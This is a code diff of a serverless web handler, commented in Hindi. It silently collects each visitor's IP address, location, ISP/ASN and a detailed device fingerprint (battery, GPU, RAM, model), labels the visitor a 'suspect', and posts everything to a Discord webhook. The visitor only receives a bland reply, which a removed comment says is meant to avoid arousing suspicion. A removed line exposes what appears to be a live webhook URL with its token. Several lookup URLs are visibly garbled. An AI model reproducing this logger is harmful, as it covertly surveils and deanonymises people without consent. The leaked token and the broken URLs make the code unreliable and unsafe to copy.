@@ -18,27 +18,32 @@ export default async function handler(req, res) {
 
             // 2. ब्राउज़र (Client) से भेजा गया हार्डवेयर डेटा
             const hardwareData = req.body || {};
-
             const timestamp = new Date().toISOString();
 
-            // 🔍 2.5. ISP और ASN लाइव लुकअप फेच करना
+            // 🔍 2.5. एडवांस और स्टेबल ISP/ASN लाइव लुकअप (HTTPS समर्थित)
             let ispName = "N/A";
             let asnDetails = "N/A";
+            
             try {
-                // Vercel हेडर्स में कभी-कभी मल्टीपल IPs होती हैं, इसलिए पहली IP का इस्तेमाल करें
-                const targetIp = ip.split(',')[0].trim();
-                const ipRes = await fetch(`http://ip-api.com{targetIp}?fields=isp,as`);
+                // Vercel हेडर्स में से केवल पहली मुख्य IP लें
+                const cleanIp = ip.split(',')[0].trim();
+                
+                // ipwho.is एक बहुत ही तेज़ और सुरक्षित (HTTPS) फ्री API है
+                const ipRes = await fetch(`https://ipwho.is{cleanIp}`);
                 if (ipRes.ok) {
                     const ipData = await ipRes.json();
-                    ispName = ipData.isp || "Unknown ISP";
-                    asnDetails = ipData.as || "Unknown ASN";
+                    if (ipData.success) {
+                        ispName = ipData.connection?.isp || "Unknown ISP";
+                        asnDetails = ipData.connection?.asn ? `AS${ipData.connection.asn}` : "Unknown ASN";
+                    }
                 }
             } catch (e) {
-                ispName = "Lookup Timeout/Error";
-                asnDetails = "Lookup Timeout/Error";
+                // यदि पहला API फेल हो तो बैकअप तरीका (Fallback)
+                ispName = "Fetch Error / Rate Limited";
+                asnDetails = "Fetch Error";
             }
 
-            // 3. पूरा फोरेंसिक लॉग कंबाइन करें
+            // 3. पूरा फोरेंसिक लॉग कंबाइन करें (Vercel Console के लिए)
             const comprehensiveLog = {
                 CASE_STATUS: "SUSPECT_INTERACTION_DETECTED",
                 TIMESTAMP: timestamp,
@@ -49,21 +54,9 @@ export default async function handler(req, res) {
                     location: `${city}, ${country}`
                 },
                 BROWSER_USER_AGENT: userAgentString,
-                HARDWARE_FINGERPRINT: {
-                    exact_model: hardwareData.exactModel || "N/A",
-                    os_version: hardwareData.osVersion || "N/A",
-                    gpu_renderer: hardwareData.gpuRenderer || "N/A",
-                    cpu_cores: hardwareData.cores || "N/A",
-                    ram_memory: hardwareData.ram || "N/A",
-                    screen_resolution: hardwareData.screenRes || "N/A",
-                    pixel_ratio: hardwareData.pixelRatio || "N/A",
-                    timezone: hardwareData.timezone || "N/A",
-                    battery_level: hardwareData.batteryLevel || "N/A",
-                    is_charging: hardwareData.isCharging || "N/A"
-                }
+                HARDWARE_FINGERPRINT: hardwareData
             };
 
-            // 🔥 यह डेटा Vercel के लाइव डैशबोर्ड पर भी प्रिंट होगा
             console.log("==================== CRIMINAL INVESTIGATION DATA ====================");
             console.log(JSON.stringify(comprehensiveLog, null, 2));
             console.log("=====================================================================");
@@ -71,7 +64,7 @@ export default async function handler(req, res) {
             // 🎨 Discord Fancy Cyber Dashboard Payload Construction
             const discordPayload = {
                 username: "🚨 CYBERCRIME INVESTIGATION",
-                avatar_url: "https://imgur.com", // डार्क थीम का हकर अवतार
+                avatar_url: "https://imgur.com",
                 embeds: [{
                     title: "💥 SUSPECT INTERACTION DETECTED",
                     color: 15548997, // लाल रंग का अलर्ट बॉक्स
@@ -79,8 +72,8 @@ export default async function handler(req, res) {
                     footer: { text: "FioMart Forensics Center • Live Intelligence" },
                     fields: [
                         { name: "🌐 NETWORK POINT", value: `**IP Address:** \`${ip}\`\n**Location:** ${city}, ${country}`, inline: false },
-                        { name: "📡 TELECOM / ISP INTELLIGENCE", value: `**Provider ISP:** \`${ispName}\`\n**Routing ASN:** \`${asnDetails}\``, inline: false },
-                        { name: "💻 DEVICE FINGERPRINT", value: `**Exact Model:** ${hardwareData.exactModel || "N/A"}\n**OS Version:** ${hardwareData.osVersion || "N/A"}\n**Timezone:** ${hardwareData.timezone || "N/A"}`, inline: true },
+                        { name: "📡 TELECOM / ISP INTELLIGENCE", value: `**Provider ISP:** \`${ispName}\`\n**Routing ASN:** \`${asnDetails}\`\n**Net Type:** \`${hardwareData.networkType || "N/A"}\``, inline: false },
+                        { name: "💻 DEVICE SIGNATURE", value: `**Exact Model:** ${hardwareData.exactModel || "N/A"}\n**OS Version:** ${hardwareData.osVersion || "N/A"}\n**Touch Support:** ${hardwareData.touchPoints > 0 ? "Yes" : "No"}`, inline: true },
                         { name: "🔋 POWER STATUS", value: `**Battery Level:** \`${hardwareData.batteryLevel || "N/A"}\`\n**Charging:** ${hardwareData.isCharging || "N/A"}`, inline: true },
                         { name: "🛠️ HARDWARE DIAGNOSTICS", value: `**CPU Cores:** ${hardwareData.cores || "N/A"} Cores\n**RAM Memory:** ${hardwareData.ram || "N/A"} GB\n**Resolution:** ${hardwareData.screenRes || "N/A"}`, inline: false },
                         { name: "🖥️ GPU RENDERER", value: `\`\`\`text\n${hardwareData.gpuRenderer || "N/A"}\n\`\`\``, inline: false },
@@ -90,7 +83,7 @@ export default async function handler(req, res) {
             };
 
             // 📡 Discord सर्वर को लाइव अलर्ट भेजना
-            const discordWebhookUrl = "https://discord.com/api/webhooks/1547324422631727185/KUjrrOelPGcmiPzBVfcnVtm6RmWO9BEyUA3U6GuJ7lcHjZJipyT5xDMRgE7DvEO7cbfK"; 
+            const discordWebhookUrl = "https://discord.com"; 
             
             await fetch(discordWebhookUrl, {
                 method: 'POST',
@@ -98,7 +91,6 @@ export default async function handler(req, res) {
                 body: JSON.stringify(discordPayload)
             });
 
-            // संदिग्ध को सामान्य रिस्पॉन्स दें ताकि उसे कोई शक न हो
             return res.status(200).json({ status: "processed" });
         } catch (err) {
             console.error("Internal Server Logger Error:", err.message);
